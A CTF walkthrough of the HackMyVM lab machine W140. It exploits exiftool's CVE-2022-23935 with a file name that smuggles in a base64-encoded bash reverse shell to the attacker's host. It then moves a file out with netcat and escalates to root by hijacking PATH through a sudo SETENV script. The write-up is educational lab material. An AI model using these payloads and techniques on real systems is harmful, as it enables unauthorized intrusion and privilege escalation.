---
title: CTF Walkthrough for HackMyVM Machine W140
date: 2024-10-25 00:00:00 +0300
category: [Walkthrough, CTF, CVE]
tags: [HackMyVM, Writeup]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/box-w140.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about W140 a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: W140<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [W140](https://downloads.hackmyvm.eu/w140.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>

   
## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140]
└─$ fping -aqg 10.0.2.16/24
<SNIP>
10.0.2.16
10.0.2.36
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/W140/Scans/Service]
└─$ nmap -sC -sV -n 10.0.2.36 -oN service-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 01:29 BST
Nmap scan report for 10.0.2.36
Host is up (0.00063s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: w140
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

We see that the target runs an SSH and a web server on ports 22 and 80 respectively. Let's visit this web application.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/1-browse.png)

This looks like a custom web application. We can click on service on the navigation bar to move to the `service.html` page.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/upload-form.png)

This allows us to upload a picture. When we upload a picture we will receive a link that will redirect us to another page.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/upload-link.png)

When we click on this link we will see an output that looks like exiftool's output.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/analyse-image.png)
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ exiftool test.png 
ExifTool Version Number         : 12.76
File Name                       : test.png
Directory                       : .
File Size                       : 521 kB
File Modification Date/Time     : 2024:10:25 01:38:29+01:00
File Access Date/Time           : 2024:10:25 01:39:10+01:00
File Inode Change Date/Time     : 2024:10:25 01:38:29+01:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1402
Image Height                    : 737
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Image Size                      : 1402x737
Megapixels                      : 1.0
```

This also returns the version of the `exiftool` used on the target. We can use this version number to search for public exploits.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/cve.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/cve-found.png)

## Exploitation

We see that this version is vulnerable to CVE-2022-23935. We can read through the POC of this exploit shown below.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/poc.png)

We can use the same procedure as shown in the POC to create a file having a name that will executed by `exiftool`. 
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ echo -n '/bin/bash -i >& /dev/tcp/10.0.2.16/1234 0>&1' | base64 
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMi4xNi8xMjM0IDA+JjE=

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ cp test.png 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMi4xNi8xMjM0IDA+JjE= | base64 -d | bash |'

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ ls
'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMi4xNi8xMjM0IDA+JjE= | base64 -d | bash |'   test.png
```

Now we can start our listener and upload the file we created above to the target.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/uploaded-file.png)

Once we upload the file, we can access it using the link given to us. After accessing it, we will get a reverse connection from the target.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.36] 59908
bash: cannot set terminal process group (445): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1729818027$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<027$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@w140:/var/www/uploads/1729818027$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@w140:/var/www/uploads/1729818027$ 
```

We have obtained a shell as the www-data user on the target. We will notice an uncommon file in the target's `/var/www` directory.
```bash
www-data@w140:/var/www$ ls -la
total 48
drwxr-xr-x  4 root     root  4096 Feb 21  2023 .
drwxr-xr-x 12 root     root  4096 Jan 29  2023 ..
-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png
drwxr-xr-x  7 root     root  4096 Feb 14  2023 html
drwx------  7 www-data root  4096 Oct 24 21:00 uploads
```

We can transfer this file to our target for further examination.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ nc -lvnp 8000 > w140.jpg                                    
listening on [any] 8000 ...
```

```bash
www-data@w140:/var/www$ nc -q 0 10.0.2.16 8000 < .w140.png 
```

This file appears to be a QR scanner.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/qr-code.png){: .center}

We can upload this QR code to a QR code reader to reveal the message in it.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-25-w140/password.png){: .center}

This appears to be a random string. This looks like a password so let's attempt to log in as a user on the local system.

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/W140/Misc File]
└─$ ssh ghost@10.0.2.36         
<SNIP>
Last login: Tue Feb 21 13:18:19 2023 from 192.168.56.46
ghost@w140:~$ ls
user.txt
```

## Post Exploitation

We have obtained access to the target as the ghost user and we can read the user flag. A quick enumeration of this user's sudo rights reveals that the user can run `/opt/Benz-w140` as root. 
```bash
ghost@w140:~$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

The `SETENV` argument is specified. This allows the user to control the environment for the privileged process. We can examine the file as shown below.
```bash
ghost@w140:~$ ls -l /opt/Benz-w140
-rwxr-xr-x 1 root root 423 Feb 17  2023 /opt/Benz-w140
ghost@w140:~$ cat /opt/Benz-w140

#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140      

# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]
then
/bin/cat log/w140.log > log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

We see that this file is used to run different commands. Notice that the `find` and `chown` commands are specified using their relative paths. This means that if we edit the PATH variable by adding an uncommon directory at the beginning we would be able to execute fake versions of this common. We can create a fake `find` command in the `/tmp` directory that will give us a root shell.
```bash
ghost@w140:/tmp$ nano find
ghost@w140:/tmp$ chmod 755 find 
ghost@w140:/tmp$ cat find 
#!/usr/bin/python3.9

import os
os.system("/bin/bash")
```

Now we can run `/opt/Benz-w140` by setting a new PATH variable. The system while looking for the `find` command in directories specified in the PATh variable, our fake command will be found first and executed.
```bash
ghost@w140:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ghost@w140:/tmp$ sudo PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games /opt/Benz-w140
root@w140:/tmp# ls /root
root.txt
```
Once executed, we obtain root access to the target and we can read the root flag.

## Conclusion

Congratulations! In this walkthrough, you have exploited CVE-2022-23935 to obtain a foothold in a Linux server. Finally, you leverage relative paths to spoof commands on the target.  This machine was designed to show how improper update practices and the use of relative paths to execute commands could affect the security posture of an organisation. Thank you for following up on this walkthrough.
